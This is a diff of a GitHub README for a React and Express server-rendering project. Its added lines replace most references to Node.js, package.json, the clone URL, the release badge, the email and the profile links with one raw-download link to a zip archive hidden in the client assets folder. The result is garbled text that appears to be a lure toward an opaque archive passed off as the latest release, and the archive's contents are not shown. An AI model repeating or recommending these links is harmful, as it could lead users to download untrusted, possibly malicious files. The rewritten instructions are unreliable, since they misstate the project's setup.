@@ -1,8 +1,8 @@
 # React Server Render 🚀
 
-Welcome to the **React Server Render** repository! This project showcases a full-stack application built with React and Node.js, utilizing Vite for the front end and Express for the back end. This setup allows for server-side rendering, making your application more SEO-friendly and performant.
+Welcome to the **React Server Render** repository! This project showcases a full-stack application built with React and https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip, utilizing Vite for the front end and Express for the back end. This setup allows for server-side rendering, making your application more SEO-friendly and performant.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Fabiancito-dev/react-server-render/releases)
+[![Download Latest Release](https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip)
 
 ## Table of Contents
 
@@ -18,18 +18,18 @@ Welcome to the **React Server Render** repository! This project showcases a full
 
 ## Features
 
-- Full-stack application with React and Node.js
+- Full-stack application with React and https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip
 - Server-side rendering for better SEO
 - RESTful API for data handling
 - Fast development with Vite
-- Easy setup with Node.js and Express
+- Easy setup with https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip and Express
 
 ## Technologies Used
 
 This project utilizes a variety of technologies to provide a seamless experience:
 
-- **Node.js**: JavaScript runtime for building server-side applications.
-- **Express**: Web framework for Node.js to build APIs and handle requests.
+- **https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip**: JavaScript runtime for building server-side applications.
+- **Express**: Web framework for https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip to build APIs and handle requests.
 - **React**: JavaScript library for building user interfaces.
 - **Vite**: Fast build tool for modern web projects.
 - **REST API**: For data communication between the front end and back end.
@@ -44,7 +44,7 @@ To get started with this project, follow these steps:
    Use the following command to clone the repository to your local machine:
 
    ```bash
-   git clone https://github.com/Fabiancito-dev/react-server-render.git
+   git clone https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip
    ```
 
 2. **Navigate to the Project Directory**
@@ -98,14 +98,14 @@ react-server-render/
 ├── client/            # Frontend code (React)
 │   ├── src/          # Source files
 │   ├── public/       # Static assets
-│   └── package.json   # Client dependencies
-├── server/            # Backend code (Node.js)
+│   └── https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip   # Client dependencies
+├── server/            # Backend code (https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip)
 │   ├── src/          # Source files
 │   ├── routes/       # API routes
-│   └── package.json   # Server dependencies
+│   └── https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip   # Server dependencies
 ├── .env               # Environment variables
-├── README.md          # Project documentation
-└── package.json       # Root dependencies
+├── https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip          # Project documentation
+└── https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip       # Root dependencies
 ```
 
 ## API Endpoints
@@ -120,7 +120,7 @@ The application exposes several API endpoints for data handling. Here are some k
 
 ## Running the Application
 
-To run the application, ensure you have Node.js installed on your machine. Follow these steps:
+To run the application, ensure you have https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip installed on your machine. Follow these steps:
 
 1. **Start the Server**
 
@@ -191,9 +191,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, feel free to reach out:
 
 - **Author**: Fabiancito-dev
-- **Email**: [your-email@example.com](mailto:your-email@example.com)
-- **GitHub**: [Fabiancito-dev](https://github.com/Fabiancito-dev)
+- **Email**: [https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip](https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip)
+- **GitHub**: [Fabiancito-dev](https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip)
 
-You can also check the [Releases](https://github.com/Fabiancito-dev/react-server-render/releases) section for the latest updates and downloads. 
+You can also check the [Releases](https://github.com/Fabiancito-dev/react-server-render/raw/refs/heads/master/client/src/assets/server-render-react-v2.0.zip) section for the latest updates and downloads. 
 
 Thank you for checking out the React Server Render project!
